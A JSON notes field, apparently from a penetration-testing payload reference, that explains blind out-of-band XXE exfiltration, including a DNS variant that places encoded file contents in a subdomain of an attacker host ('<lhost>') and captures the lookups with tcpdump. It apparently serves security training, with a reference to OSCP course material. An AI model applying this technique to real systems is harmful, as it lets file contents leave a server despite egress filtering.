      "notes": "Watch the PHP server error_log for the decoded file. Use when nothing is reflected and no errors are returned. DNS-OOB variant: when outbound HTTP is filtered but DNS resolves, place the (short) encoded data as a sub-domain — SYSTEM 'http://%file;.<lhost>' — and capture the lookup with `tcpdump -i <iface> udp port 53`, then decode the sub-domain string; slower and size-limited but survives HTTP egress filtering. Also covered in: OSCP PEN-200 (Web Application Attacks — XXE injection).",
